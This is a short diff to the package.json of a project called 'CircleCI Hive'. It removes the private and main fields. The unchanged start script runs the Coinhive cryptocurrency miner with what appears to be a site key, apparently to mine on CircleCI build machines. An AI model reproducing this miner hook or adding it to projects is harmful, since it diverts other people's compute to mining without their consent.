@@ -3,10 +3,8 @@
   "productName": "circleci-hive",
   "description": "CircleCI Hive",
   "version": "1.1.1",
-  "private": true,
   "author": "Dam Viet <damviet112@gmail.com>",
   "copyright": "© 2018, Applancer inc.",
-  "main": "main.js",
   "scripts": {
     "start": "coin-hive 5x0W6yAYe5mlDJ9dDZYHxlfuMZx40wgW"
   },
